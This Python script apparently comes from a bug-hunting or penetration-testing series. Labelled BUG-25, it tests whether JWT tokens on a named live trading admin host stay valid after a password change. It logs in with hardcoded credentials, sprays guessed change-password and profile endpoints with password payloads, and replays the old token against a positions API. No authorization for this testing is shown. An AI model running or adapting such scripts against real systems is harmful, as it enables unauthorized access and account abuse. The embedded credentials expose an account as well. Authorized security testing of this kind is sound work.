"""
BUG-25: JWT Token Not Invalidated on Password Change (Session Fixation)
Attack: 
  1. Login and capture JWT token
  2. Change password via API
  3. Use OLD token to call protected endpoints
  4. If old token still works → session fixation / token not invalidated
"""
import requests, json, time

BASE_URL = "https://lpadmin.blackfx.com"

# Step 1: Login and capture token
s_old = requests.Session()
r = s_old.post(f"{BASE_URL}/api/auth/login", json={"email": "mamf3@mailinator.com", "password": "12345678"})
print("Initial login:", r.status_code)
t_resp = s_old.post(f"{BASE_URL}/api/auth/chart-token").json()
old_token = t_resp.get("token")
old_headers = {"Authorization": f"Bearer {old_token}", "Content-Type": "application/json"}
print(f"Old token captured: {old_token[:40]}...")

# Verify old token works
test_r = s_old.get(f"{BASE_URL}/v1/oms/real/positions", headers=old_headers)
print(f"Old token test (before pw change): {test_r.status_code}")

# Step 2: Change password via API (look for change password endpoint)
# Try common endpoints
change_endpoints = [
    f"{BASE_URL}/api/auth/change-password",
    f"{BASE_URL}/api/users/change-password",
    f"{BASE_URL}/api/profile/change-password",
    f"{BASE_URL}/api/auth/reset-password",
    f"{BASE_URL}/api/members/change-password",
]
change_payload = {"current_password": "12345678", "new_password": "12345678", "password": "12345678"}
# Note: We use same password to avoid locking ourselves out

for ep in change_endpoints:
    r2 = s_old.post(ep, headers=old_headers, json=change_payload)
    print(f"Change pw at {ep.split('/')[-1]}: {r2.status_code} {r2.text[:100]}")

# Try profile update with password field
profile_endpoints = [
    f"{BASE_URL}/api/profile",
    f"{BASE_URL}/api/auth/profile",
    f"{BASE_URL}/api/users/profile",
]
for ep in profile_endpoints:
    r3 = s_old.put(ep, headers=old_headers, json={"password": "12345678", "new_password": "12345678"})
    print(f"Profile update at {ep.split('/')[-1]}: {r3.status_code} {r3.text[:100]}")

# Step 3: Get a NEW token (simulate attacker who has old token)
# Log in fresh to compare
s_new = requests.Session()
s_new.post(f"{BASE_URL}/api/auth/login", json={"email": "mamf3@mailinator.com", "password": "12345678"})
new_token_resp = s_new.post(f"{BASE_URL}/api/auth/chart-token").json()
new_token = new_token_resp.get("token")
print(f"\nNew token: {new_token[:40]}...")
print(f"Tokens are different: {old_token != new_token}")

# Step 4: Use OLD token on fresh request (no session, raw headers only)
raw_headers = {"Authorization": f"Bearer {old_token}", "Content-Type": "application/json"}
test_old = requests.get(f"{BASE_URL}/v1/oms/real/positions", headers=raw_headers)
print(f"\nOld token after re-login (new session elsewhere): {test_old.status_code}")
print(f"Old token body: {test_old.text[:200]}")

if test_old.status_code == 200:
    print("\n🚨 BUG-25 CONFIRMED: Old JWT still valid after new login (no token invalidation on new session)!")
    print("   Impact: Stolen/leaked tokens remain valid indefinitely regardless of re-authentication.")
else:
    print(f"\n✅ BUG-25 NOT confirmed: Old token rejected with {test_old.status_code}")

print("\nBUG-25 test complete.")
